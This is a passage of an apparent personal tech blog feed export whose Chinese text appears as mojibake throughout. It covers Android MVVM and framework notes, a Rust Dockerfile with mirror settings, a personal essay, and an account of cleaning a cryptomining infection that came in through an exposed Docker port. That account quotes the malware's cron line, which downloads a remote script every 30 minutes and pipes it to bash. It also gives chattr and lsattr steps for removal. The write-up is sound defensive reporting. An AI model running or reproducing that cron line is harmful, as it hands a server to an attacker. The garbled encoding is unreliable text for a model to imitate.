·çœ‹æ¥ï¼Œæ˜¯ä¸æ˜¯åªè¦ç”¨å¥½è¿™ä¸ªæ–¹æ³•ï¼ŒFlowå°±å®Œå…¨å¯ä»¥æ›¿ä»£LiveDataï¼Œå¯¹å§ã€‚</p><p>ä½†å…¶å®LiveDataå’ŒFlowè¿˜æœ‰ä¸€äº›ä¸åŒä¹‹å¤„ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½å®Œå…¨æŠ›å¼ƒLiveDataï¼Œè€Œæ˜¯è¦å› åœ°åˆ¶å®œã€‚</p><p>å½“ç„¶ï¼Œä½¿ç”¨å®ƒæ¥æ”¶é›†flowè¿˜æœ‰ä¸€ä¸ªå¿«æ·çš„å†™æ³•<code>flowWithLifecycle(LifecycleOwner)</code></p><h2 id="å…¶ä¸‰-åœ¨onViewCreatedä¸­è¯·æ±‚æ•°æ®"><a href="#å…¶ä¸‰-åœ¨onViewCreatedä¸­è¯·æ±‚æ•°æ®" class="headerlink" title="å…¶ä¸‰ åœ¨onViewCreatedä¸­è¯·æ±‚æ•°æ®"></a>å…¶ä¸‰ åœ¨onViewCreatedä¸­è¯·æ±‚æ•°æ®</h2><p>åœ¨ MVVM ä¸­, ViewModel çš„é‡è¦èŒè´£æ˜¯è§£è€¦ View ä¸ Modelã€‚</p><ul><li>View å‘ ViewModel å‘å‡ºæŒ‡ä»¤ï¼Œè¯·æ±‚æ•°æ®</li><li>View é€šè¿‡ DataBinding æˆ– LiveData ç­‰è®¢é˜… ViewModel çš„æ•°æ®å˜åŒ–</li></ul><p>å…³äºè®¢é˜… ViewModel çš„æ—¶æœºï¼Œå¤§å®¶ä¸€èˆ¬æ”¾åœ¨ <code>onViewCreated</code> ï¼Œè¿™æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ä½†æ˜¯ä¸€ä¸ªå¸¸çŠ¯çš„é”™è¯¯æ˜¯å°† ViewModel ä¸­é¦–æ¬¡çš„æ•°æ®åŠ è½½ä¹Ÿæ”¾åˆ° <code>onViewCreated</code> ä¸­è¿›è¡Œã€‚å¦‚æœ ViewModel åœ¨ <code>onViewCreated</code> ä¸­è¯·æ±‚æ•°æ®ï¼Œå½“ View å› ä¸ºæ¨ªç«–å±ç­‰åŸå› é‡å»ºæ—¶ä¼šå†æ¬¡è¯·æ±‚ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ ViewModel çš„ç”Ÿå‘½å‘¨æœŸé•¿äº Viewï¼Œæ•°æ®å¯ä»¥è·¨è¶Š View çš„ç”Ÿå‘½å‘¨æœŸå­˜åœ¨ï¼Œæ‰€ä»¥æ²¡æœ‰å¿…è¦éšç€ View çš„é‡å»ºåå¤è¯·æ±‚ã€‚</p><blockquote><p>ViewModel çš„åˆæ¬¡æ•°æ®åŠ è½½æ¨èæ”¾åˆ° <code>init{}</code> ä¸­è¿›è¡Œï¼Œè¿™æ ·å¯ä»¥ä¿è¯ <code>ViewModelScope</code> ä¸­åªåŠ è½½ä¸€æ¬¡</p></blockquote><h2 id="å…¶å››-ä½¿ç”¨LiveData-amp-StateFlowå‘é€Events"><a href="#å…¶å››-ä½¿ç”¨LiveData-amp-StateFlowå‘é€Events" class="headerlink" title="å…¶å›› ä½¿ç”¨LiveData &amp; StateFlowå‘é€Events"></a>å…¶å›› ä½¿ç”¨LiveData &amp; StateFlowå‘é€Events</h2><p>LiveDataå’ŒStateFlowè¢«è®¾è®¡æ¥ä¿å­˜ä¸€ä¸ªçŠ¶æ€ï¼Œå•ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼Œå®ƒä»¬è®¾è®¡å¾—éå¸¸åˆ°ä½ï¼Œå®Œç¾çš„ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ã€‚ä½†å¦‚æœæˆ‘ä»¬çš„éœ€æ±‚ä¸æ˜¯ä¿å­˜ä¸€ä¸ªçŠ¶æ€ï¼Œè€Œåªæ˜¯å¸Œæœ›å®ƒåœ¨æ”¶åˆ°ä¸€ä¸ªå€¼æ—¶èƒ½å¤Ÿé€šçŸ¥è§‚å¯Ÿè€…ï¼Œä¹Ÿè®¸å®ƒä»¬å°±ä¸å¤ªé€‚åˆäº†ã€‚</p><p>LiveDataåœ¨è®¾è®¡æ—¶è¢«èµ‹äºˆäº†æ•°æ®å€’çŒçš„ç‰¹æ€§ï¼Œå›åˆ°ç•Œé¢æ—¶ä¼šå†æ¬¡é€šçŸ¥ä¸€æ¬¡è§‚å¯Ÿè€…ï¼Œäº‹ä»¶åº”è¯¥æ˜¯å…·æœ‰æ—¶æ•ˆæ€§çš„ï¼Œè¿™æ ·ä¸æˆ‘ä»¬çš„éœ€æ±‚ä¸ç¬¦ã€‚</p><p>LiveDataå’ŒStateFlowéƒ½ä¼šäº§ç”Ÿä¸¢å€¼çš„é—®é¢˜ï¼Œå› ä¸ºLiveDataå’ŒStateFlowè®¾è®¡çš„æ—¶å€™éƒ½åªè€ƒè™‘äº†ä¿ç•™ä¸€ä¸ªå€¼çš„æƒ…å†µï¼Œæ‰€ä»¥å¯¹ä»–ä»¬è€Œè¨€ï¼Œæœ€æ–°çš„å€¼æ‰æ˜¯æœ€é‡è¦çš„ï¼Œå·²ç»è¿‡æœŸçš„å€¼å°±æ²¡æœ‰å¿…è¦é€šçŸ¥ï¼Œå‡å°‘ä¸‹æ¸¸çš„å¤„ç†é€»è¾‘ï¼ŒèŠ‚çœæ€§èƒ½ï¼Œæ‰€ä»¥è¿™å¹¶ä¸æ˜¯bugï¼Œè€Œæ˜¯ä¸€ç§ç‰¹æ€§ã€‚StateFlowè¿˜ä¼šå¿½ç•¥é‡å¤å‘é€çš„ç›¸åŒçš„å€¼ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç§°ä¸º<strong>é˜²æŠ–</strong>ã€‚</p><h2 id="å…¶äº”-åœ¨Repositoryå±‚ä¸­ä½¿ç”¨LiveData"><a href="#å…¶äº”-åœ¨Repositoryå±‚ä¸­ä½¿ç”¨LiveData" class="headerlink" title="å…¶äº” åœ¨Repositoryå±‚ä¸­ä½¿ç”¨LiveData"></a>å…¶äº” åœ¨Repositoryå±‚ä¸­ä½¿ç”¨LiveData</h2><p>æˆ‘ä»¬åº”è¯¥ç»å¸¸åœ¨ä»“åº“å±‚ä½¿ç”¨RxJavaæˆ–è€…Flowï¼Œä½†å…¶å®å¾ˆå°‘è§åˆ°è¯´åœ¨ä»“åº“å±‚ä½¿ç”¨LiveDataï¼Œåœ¨æˆ‘å°è±¡ä¸­è¿™ä¸‰è€…åº”è¯¥è‡³å°‘æ˜¯æ¯”è¾ƒç±»ä¼¼çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆLiveDataä¸è¡Œå‘¢ï¼Ÿæœ‰ä¸¤ç‚¹ç‚¹åŸå› :</p><ul><li>é‡åº¦ä¾èµ–lifecycleï¼Œä»“åº“å±‚è·å–ä¸åˆ°lifecycleOwnerï¼Œåªèƒ½ä½¿ç”¨observeForeverè¿™ç§å¯èƒ½é€ æˆå†…å­˜æ³„æ¼çš„æ–¹æ³•æ¥è¿›è¡Œ</li><li>ä¸æ”¯æŒçº¿ç¨‹åˆ‡æ¢ æ•…æ‰€æœ‰æ“ä½œç¬¦å®é™…ä¸Šé»˜è®¤éƒ½æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Šè¿è¡Œ</li></ul><h2 id="å…¶å…­-ViewModelæ¥å£æš´éœ²ä¸åˆç†"><a href="#å…¶å…­-ViewModelæ¥å£æš´éœ²ä¸åˆç†" class="headerlink" title="å…¶å…­ ViewModelæ¥å£æš´éœ²ä¸åˆç†"></a>å…¶å…­ ViewModelæ¥å£æš´éœ²ä¸åˆç†</h2><ul><li>æš´éœ²MutableçŠ¶æ€</li><li>æš´éœ²suspendæ–¹æ³•</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> MVVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android frameworkå±‚å­¦ä¹ ç¬”è®°</title>
      <link href="/2022/09/03/framework-study/"/>
      <url>/2022/09/03/framework-study/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-frameworkå±‚å­¦ä¹ ç¬”è®°"><a href="#Android-frameworkå±‚å­¦ä¹ ç¬”è®°" class="headerlink" title="Android frameworkå±‚å­¦ä¹ ç¬”è®°"></a>Android frameworkå±‚å­¦ä¹ ç¬”è®°</h1><h2 id="é›¶ç¢çš„Q-amp-A"><a href="#é›¶ç¢çš„Q-amp-A" class="headerlink" title="é›¶ç¢çš„Q &amp; A"></a>é›¶ç¢çš„Q &amp; A</h2><blockquote><p>ä¸ºä»€ä¹ˆSystemService(AMS)è¿›ç¨‹ä¸Zygoteè¿›ç¨‹é€šä¿¡ä¸ä½¿ç”¨Binderè€Œä½¿ç”¨Socket?</p></blockquote><p>å› ä¸ºZygoteè¿›ç¨‹çš„forkæ“ä½œä»…å…è®¸åœ¨å•çº¿ç¨‹ä¸‹è¿›è¡Œï¼Œè€ŒBinderä¹‹æ‰€ä»¥é«˜æ€§èƒ½çš„éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºå®ƒæ˜¯å¤šçº¿ç¨‹çš„ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆZygoteåªèƒ½åœ¨å•çº¿ç¨‹ä¸‹fork</p></blockquote><p>å…ˆæ¥çœ‹çœ‹Zygote forkè¿›ç¨‹çš„å·¥ä½œåŸç†</p><blockquote><ol><li>çˆ¶è¿›ç¨‹çš„å†…å­˜æ•°æ®ä¼šåŸå°ä¸åŠ¨çš„æ‹·è´åˆ°å­è¿›ç¨‹ä¸­ï¼ˆcopy-on-writeç­–ç•¥ -&gt; å¤åˆ¶æ—¶å†…æ ¸å¹¶ä¸å¤åˆ¶æ•´ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œè€Œæ˜¯è®©çˆ¶å­è¿›ç¨‹å…±äº«åŒä¸€ä¸ªåœ°å€ç©ºé—´ã€‚åªç”¨åœ¨éœ€è¦å†™å…¥çš„æ—¶å€™æ‰ä¼šå¤åˆ¶åœ°å€ç©ºé—´ï¼Œä»è€Œä½¿å„ä¸ªè¿›è¡Œæ‹¥æœ‰å„è‡ªçš„åœ°å€ç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œèµ„æºçš„å¤åˆ¶æ˜¯åœ¨éœ€ è¦å†™å…¥çš„æ—¶å€™æ‰ä¼šè¿›è¡Œï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œåªæœ‰ä»¥åªè¯»æ–¹å¼å…±äº«ï¼‰</li><li><strong>å­è¿›ç¨‹åœ¨å•çº¿ç¨‹çŠ¶æ€ä¸‹è¢«ç”Ÿæˆ</strong></li></ol></blockquote><p>æ³¨æ„ç¬¬äºŒå¥è¯ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«forkå‡ºæ¥çš„è¿›ç¨‹åªä¼šå¸¦æœ‰ä¸€æ¡çº¿ç¨‹ï¼Œæ— è®ºçˆ¶è¿›ç¨‹æœ‰å‡ æ¡çº¿ç¨‹</p><p>è€Œä¸Šé¢æˆ‘ä»¬è¯´è¿‡äº†ï¼ŒBinderæ˜¯åŸºäºå¤šçº¿ç¨‹æ“ä½œçš„ã€‚è®¾æƒ³å¦‚æœæˆ‘ä»¬ä½¿ç”¨Binderæ¥è¿›è¡Œforkæ“ä½œï¼Œä¼šå‘ç”Ÿä»€ä¹ˆçŠ¶å†µï¼š</p><blockquote><p>å¦‚æœä¸€ä¸ªBinderè¿›ç¨‹æœ‰é”ï¼Œé‚£ä¹ˆå…¶æ‹·è´çš„å­è¿›ç¨‹ä¸Šçš„ä¸»çº¿ç¨‹ä¹Ÿä¼šå­˜åœ¨é”ï¼Œå­è¿›ç¨‹ç­‰å¾…å…¶å­çº¿ç¨‹çš„èµ„æºæ¥é‡Šæ”¾å…¶æ‹¥æœ‰çš„é”ï¼Œç„¶è€Œå…¶çˆ¶è¿›ç¨‹çš„å­çº¿ç¨‹å¹¶ä¸ä¼šæ‹·è´è¿‡æ¥ï¼Œå› ä¸ºæ ¹æ®forkçš„å·¥ä½œï¼Œå®ƒçš„å­è¿›ç¨‹åªä¼šè¢«ç”Ÿæˆå•çº¿ç¨‹ï¼Œè€Œè¿™æ ·ä¸€æ¥å°±ä¼šé€ æˆæ­»é”ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜forkå°±ä¸å…è®¸å­˜åœ¨å¤šçº¿ç¨‹ï¼Œæ‰€æœ‰Zygoteä¹Ÿå°±ä¸å†ä½¿ç”¨Binderè¿›ç¨‹äº†ã€‚</p></blockquote><p>è¿™é‡Œæˆ‘æœ‰ä¸ªç–‘é—®ï¼Œå¦‚æœæ˜¯ä¸å­˜åœ¨é”çš„å¤šçº¿ç¨‹å‘¢ï¼Ÿè¿™é‡Œçš„è§£é‡Šæ˜¯å› ä¸ºä¼šå¯¼è‡´æ­»é”è€Œä¸ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå¦‚æœå‹æ ¹å°±æ²¡æœ‰ä½¿ç”¨é”å‘¢ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> frameworkå±‚ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºRustå†™çš„åç«¯é…ç½®docker</title>
      <link href="/2022/09/03/docker-configuration-for-rust-server/"/>
      <url>/2022/09/03/docker-configuration-for-rust-server/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºRustå†™çš„åç«¯é…ç½®docker"><a href="#ä¸ºRustå†™çš„åç«¯é…ç½®docker" class="headerlink" title="ä¸ºRustå†™çš„åç«¯é…ç½®docker"></a>ä¸ºRustå†™çš„åç«¯é…ç½®docker</h1><p>æœ€è¿‘å°è¯•ç”¨rustå†™äº†ä¸€ä¸ªåç«¯æœåŠ¡ï¼Œæƒ³éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚å½“ç„¶æ˜¯ç”¨dockeréƒ¨ç½²ï¼Œè‡ªä»æ¥è§¦äº†dockerï¼Œæˆ‘å¾ˆå¿«ä¾¿çˆ±ä¸Šäº†å®ƒ~</p><p>ç„¶åæˆ‘å‘ç°rustçš„dockeré…ç½®ä¼¼ä¹ä¸javaä¸åŒ..?javaåªéœ€è¦æŠŠç¼–è¯‘å‡ºæ¥çš„jaræ‰”åˆ°dockeré‡Œé¢ï¼Œç„¶åç›´æ¥java -jarä¾¿å¯ä»¥è¿è¡Œï¼Œä½†rustä¼¼ä¹éœ€è¦æŠŠæ•´ä¸ªä»£ç å…¨éƒ¨copyåˆ°dockerä¸­åœ¨ç¼–è¯‘ç¯å¢ƒç¼–è¯‘ç„¶åæ‰èƒ½éƒ¨ç½²ï¼Œç„¶è€Œrustçš„ç¼–è¯‘åˆæå…¶æ¶ˆè€—æ€§èƒ½ï¼Œå¯¼è‡´æˆ‘ç¬¬ä¸€æ¬¡éƒ¨ç½²æ—¶ç›´æ¥æŠŠæœåŠ¡å™¨ç»™å¡å´©äº†ã€‚</p><p>åæ¥èŠ±äº†50å—ç»™æœåŠ¡å™¨å‡çº§æˆäº†2c4gï¼Œå†æ¬¡å°è¯•éƒ¨ç½²ï¼Œè¿™æ¬¡åˆå‡ºç°äº†ç»å…¸é—®é¢˜</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png" alt="2022052901"></p><p>æ€ä¹ˆåŠå‘¢ï¼Œå½“ç„¶æ˜¯ç»™cargoæ¢é•œåƒæºå’¯ã€‚</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN touch /usr/local/cargo/config.toml# cargo ä¸Šæµ·äº¤å¤§é•œåƒæºRUN sed -e a\[source.crates-io] /usr/local/cargo/config.toml;\    sed -e a\registry=\"https://github.com/rust-lang/crates.io-index\" /usr/local/cargo/config.toml; \    sed -e a\replace-with=\'sjtu\' /usr/local/cargo/config.toml; \    sed -e a\[source.sjtu] /usr/local/cargo/config.toml; \    sed -e a\registry=\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸‹å­å°±éƒ¨ç½²æˆåŠŸäº†</p><p>åæ§½ä¸€ä¸‹ï¼Œæ¯æ¬¡éƒ¨ç½²éƒ½è¦èŠ±å¤§æ¦‚åŠä¸ªå°æ—¶ï¼Œè€Œä¸”cpuå ç”¨ç‡èƒ½åƒåˆ°99.75%ï¼Œç¼–è¯‘æˆåŠŸåçš„é•œåƒå¤§å°èƒ½è¾¾åˆ°6ä¸ªGï¼Œå®åœ¨æ˜¯ä¸å¤ªè¡Œã€‚</p><p>å…¨éƒ¨ä»£ç </p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM rustWORKDIR /usr/src/collection-apiCOPY . .RUN touch /usr/local/cargo/config.toml# cargo ä¸Šæµ·äº¤å¤§é•œåƒæºRUN sed -e a\[source.crates-io] /usr/local/cargo/config.toml;\    sed -e a\registry=\"https://github.com/rust-lang/crates.io-index\" /usr/local/cargo/config.toml; \    sed -e a\replace-with=\'sjtu\' /usr/local/cargo/config.toml; \    sed -e a\[source.sjtu] /usr/local/cargo/config.toml; \    sed -e a\registry=\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\"# Rustup æ¸…åé•œåƒæºENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustupENV DATABASE_URL *RUN cargo install --path .CMD ["collection-api"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äº¤å‰ç¼–è¯‘"><a href="#äº¤å‰ç¼–è¯‘" class="headerlink" title="äº¤å‰ç¼–è¯‘"></a>äº¤å‰ç¼–è¯‘</h2><blockquote><p>åœ¨æœ¬åœ°ç¼–è¯‘å¯¹åº”ç›®æ ‡ç³»ç»Ÿçš„äº§å“</p></blockquote><p>å¦‚æœèƒ½ç”¨è¿™ä¸ªçš„è¯ï¼Œé‚£å°±åªéœ€è¦æŠŠäº§å“æ‰”åˆ°dockeré‡Œé¢ï¼Œdockeræºä¹Ÿåªéœ€è¦ç”¨æœ€å°çš„airplaneäº†å§ã€‚</p><p>ä¸‹æ¬¡ç ”ç©¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡æœåŠ¡å™¨é­åˆ°æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„ç»å†</title>
      <link href="/2022/09/03/deal-with-viruses-in-the-server/"/>
      <url>/2022/09/03/deal-with-viruses-in-the-server/</url>
      
        <content type="html"><![CDATA[<h1 id="è®°ä¸€æ¬¡æœåŠ¡å™¨é­åˆ°æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„ç»å†"><a href="#è®°ä¸€æ¬¡æœåŠ¡å™¨é­åˆ°æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„ç»å†" class="headerlink" title="è®°ä¸€æ¬¡æœåŠ¡å™¨é­åˆ°æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„ç»å†"></a>è®°ä¸€æ¬¡æœåŠ¡å™¨é­åˆ°æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„ç»å†</h1><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>åœ¨é¼“æ£dockerï¼Œçœ‹äº†ä¸€äº›æ•™ç¨‹ï¼Œä¸ºäº†æ–¹ä¾¿ä¸€äº›æ“ä½œæ‰“å¼€äº†2375ç«¯å£ï¼Œå¯¼è‡´è¢«äººdockeræ³¨å…¥äº†ã€‚</p><h2 id="åº”å¯¹è¿‡ç¨‹"><a href="#åº”å¯¹è¿‡ç¨‹" class="headerlink" title="åº”å¯¹è¿‡ç¨‹"></a>åº”å¯¹è¿‡ç¨‹</h2><p>å…¶å®æˆ‘ä¹‹å‰å®Œå…¨æ²¡æœ‰é¢å¯¹è¿‡æœåŠ¡å™¨é­åˆ°ç—…æ¯’æ”»å‡»çš„é—®é¢˜â€¦æœ€å¼€å§‹æ˜¯è…¾è®¯äº‘ç»™æˆ‘å‘çŸ­ä¿¡ï¼Œè¯´æˆ‘çš„æœåŠ¡å™¨å­˜åœ¨å±é™©è¡Œä¸ºï¼Œå¹¶ä¸”å°ç¦äº†è¿™å°æœåŠ¡å™¨ä¸€å¤©ã€‚</p><p>å½“æ—¶ä¸€ä¸Šå»æˆ‘å°±æ„Ÿè§‰åˆ°ä¸å¯¹äº†ï¼ŒæœåŠ¡å™¨ä¸Šç»å¸¸è«åå¥‡å¦™å¤šä¸€ä¸ªdockeré•œåƒï¼Œåˆ äº†ä¹Ÿæ²¡ç”¨ã€‚</p><p>åé¢æˆ‘ä½¿ç”¨<code>crontab -l</code>æ’æŸ¥äº†ä¸€ä¸‹å®šæ—¶ä»»åŠ¡ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªå¥‡æ€ªçš„ä»»åŠ¡ã€‚</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹æ ·å­è¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨äº†ï¼Œå®ƒä¼šå®šæ—¶ä¸‹è½½ä¸€ä¸ªè„šæœ¬æ–‡ä»¶å¹¶ä¸”æ‰§è¡Œã€‚é‚£ä¹ˆåªè¦æŠŠå®ƒåˆ æ‰ä¸å°±å®Œäº‹å¤§å‰äº†ï¼Ÿ</p><p>äºæ˜¯æˆ‘è¯•å›¾ç”¨<code>crontab -e</code>åˆ æ‰å®ƒï¼Œæœ€åå´å‘ç°æ— æ³•ç¼–è¾‘è¿™ä¸ªé…ç½®ã€‚</p><blockquote><p>â€œ/tmp/crontab.Awo30zâ€ 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p></blockquote><p>ç—…æ¯’æ€ä¹ˆå¯èƒ½ä¼šè®©ä½ è½»æ¾çš„åˆ æ‰è¿™ä¸ªå®šæ—¶ä»»åŠ¡ï¼Ÿå®ƒä¿®æ”¹äº†æ–‡ä»¶çš„å±æ€§ï¼Œè®©å®ƒæ— æ³•è¢«ä¿®æ”¹â€”â€”å³ä¾¿ä½ æ‹¥æœ‰rootçš„æœ€é«˜æƒé™ã€‚</p><p>ç™¾åº¦åæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ</p><blockquote><p> æŸ¥çœ‹æ˜¯å¦æœ‰ç‰¹æ®Šçš„å±æ€§ lsattr /var/spool/cron/ </p><p> å»æ‰ç‰¹æ®Šçš„å±æ€§ chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p></blockquote><p>ä½†æ˜¯æœ‰ä¸€ç‚¹å¾ˆå¥‡æ€ªï¼Œæˆ‘çš„è…¾è®¯äº‘æœºå™¨ä¸Šæ— æ³•ä½¿ç”¨chattræŒ‡ä»¤ã€‚ä»–ä¼šè¯¢é—®æˆ‘æ˜¯å¦å®‰è£…ä¸€ä¸ªåŒ…ï¼Œä½†çœŸå®‰è£…æ—¶å´è¯´è¿™ä¸ªåŒ…å·²ç»å®‰è£…è¿‡äº†ï¼Œä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯ç—…æ¯’æå¾—é¬¼ã€‚</p><blockquote><p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not foundâ€¦<br>Install package â€˜e2fsprogsâ€™ to provide command â€˜chattrâ€™? [N/y] y  </p><ul><li>Waiting in queueâ€¦ Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li></ul></blockquote><p>äºæ˜¯æˆ‘æŠŠåŒ…ç»™å¸è½½é‡è£…äº†ä¸€æ¬¡ï¼Œå°±å¯ä»¥äº†</p><blockquote><p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p></blockquote><p>å»é™¤ç‰¹æ®Šæƒé™åå°±å¯ä»¥ç¼–è¾‘å®šæ—¶ä»»åŠ¡äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºäººç”Ÿåšäº›å‡æ³•</title>
      <link href="/2022/09/03/do-some-subtraction-to-my-life/"/>
      <url>/2022/09/03/do-some-subtraction-to-my-life/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºäººç”Ÿåšäº›å‡æ³•"><a href="#ä¸ºäººç”Ÿåšäº›å‡æ³•" class="headerlink" title="ä¸ºäººç”Ÿåšäº›å‡æ³•"></a>ä¸ºäººç”Ÿåšäº›å‡æ³•</h1><blockquote><p>äººç”Ÿåº”å½“æœ‰æ‰€å–èˆï¼Œæœ‰æ‰€å–ä¹Ÿåº”æœ‰æ‰€èˆ</p></blockquote><p>æœ€è¿‘å‘ç°è‡ªå·±æƒ³è¦çš„ä¸œè¥¿å¤ªå¤šäº†ã€‚</p><p>å½“ç„¶æˆ‘ä¸ªäººåœ¨ç‰©è´¨ä¸Šçš„è¿½æ±‚ä¸€ç›´ç»´æŒåœ¨ä¸€ä¸ªæ¯”è¾ƒä½çš„æ°´å¹³ã€‚ä½†æˆ‘å¯¹å„ç§æŠ€æœ¯éƒ½ç›¸å½“æ„Ÿå…´è¶£ï¼Œå¹¶ä¸”å¸Œæœ›èƒ½å¤Ÿå­¦ä¹ ä»–ä»¬ï¼ŒæŒæ¡ä»–ä»¬ã€‚Androidå¼€å‘ï¼ŒKtorï¼ŒVueï¼ŒReactâ€¦æˆ‘è´ªå¿ƒçš„æƒ³è¦å…¨éƒ¨æŒæ¡ã€‚ä¹ƒè‡³å…¥å­¦æ—¶åŒæ—¶æˆä¸ºäº†çº¢å²©ç½‘æ ¡ä¸‰ä¸ªéƒ¨é—¨çš„å­¦å‘˜ï¼ˆè™½ç„¶åé¢å› ä¸ºå­¦ä¸šå‹åŠ›é€€äº†ä¸€ä¸ªï¼‰ã€‚</p><p>è¿™æ ·åšçš„ä»£ä»·æ˜¯ï¼Œæˆ‘ç‰ºç‰²äº†æˆ‘å¤§å­¦çš„æ­£è¯¾çš„ä¸€äº›å­¦ä¹ æ—¶é—´ï¼Œç‰ºç‰²äº†è·Ÿæœ‹å‹ä¸€èµ·æ‰“æ¸¸æˆçš„æ—¶é—´ã€‚æˆ‘ä¸åæ‚”è¿™æ ·åšï¼Œé‚£æ®µæ—¶é—´æˆ‘è¿‡å¾—ååˆ†çš„å……å®ï¼Œä½†æˆ‘å‘ç°æˆ‘åœ¨Androidå’Œå‰ç«¯æ–¹é¢çš„æŠ€æœ¯è¿›æ­¥éƒ½ååˆ†ç¼“æ…¢ï¼Œå¹¶ä¸”æˆ‘ä¹Ÿé€æ¸åŠ›ä¸ä»å¿ƒäº†ã€‚<em><strong>ä¹Ÿæ˜¯ï¼Œæˆ‘ä¸æ˜¯ä»€ä¹ˆè¶…äººï¼Œåˆ«äººåªèƒ½åšå¥½ä¸€ä»¶äº‹ï¼Œæˆ‘å‡­ä»€ä¹ˆè®¤ä¸ºæˆ‘èƒ½åŒæ—¶åšå¥½ä¸¤ä»¶ï¼Ÿ</strong></em></p><p>è¿™æ ·ä¸‹å»ï¼Œä¸¤è¾¹çš„å‹åŠ›ä¼šæŠŠæˆ‘ä¸¤é¢çš„æŠ€æœ¯éƒ½æ‹–å®ã€‚ä¹Ÿè®¸åŒçº¿ä½œæˆ˜ä»æ ¹æœ¬ä¸Šå°±æ˜¯ä¸ªé”™è¯¯ã€‚è€Œæˆ‘çš„å¤§å­¦ç”Ÿæ´»ä¹Ÿå®Œå…¨è¢«å­¦ä¹ æŠ€æœ¯è¿™ä»¶äº‹æ‰€åå™¬ï¼Œæˆ‘åº”è¯¥æ”¾æ¾ä¸‹æ¥ï¼Œåˆ†å‡ºä¸€éƒ¨åˆ†æ—¶é—´å»äº«å—è¿™æ®µäººç”Ÿä¸­æœ€ç¾å¥½çš„æ—¶å…‰ã€‚</p><p>é‚£ä¹ˆä¹Ÿæ˜¯åšå–èˆçš„æ—¶å€™äº†ï¼Œæˆ‘çš„é€‰æ‹©æ˜¯æ·±å…¥é’»ç ”Androidå¼€å‘å¹¶ä»¥åä»¥æ­¤ä¸ºä¸»ä¸šï¼Œè€Œå‰ç«¯å¼€å‘åˆ™ä½œä¸ºçˆ±å¥½ï¼Œåœ¨æœ‰ç©ºé—²ä¹‹æ—¶ç 